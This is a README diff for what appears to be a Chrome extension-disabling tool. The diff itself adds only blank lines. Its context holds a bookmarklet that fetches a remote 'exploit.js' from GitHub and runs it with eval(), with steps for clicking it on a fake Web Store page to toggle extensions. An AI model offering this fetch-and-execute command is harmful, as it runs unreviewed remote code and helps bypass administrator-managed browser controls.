@@ -44,6 +44,8 @@ Credit to CompactCow#4717 for the amazing UI!
 ```js
 javascript:fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
 ```
+
+
 3. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
 4. Click the bookmark (Make sure you are on the page above!)
 5. Use the menu to toggle your extensions!
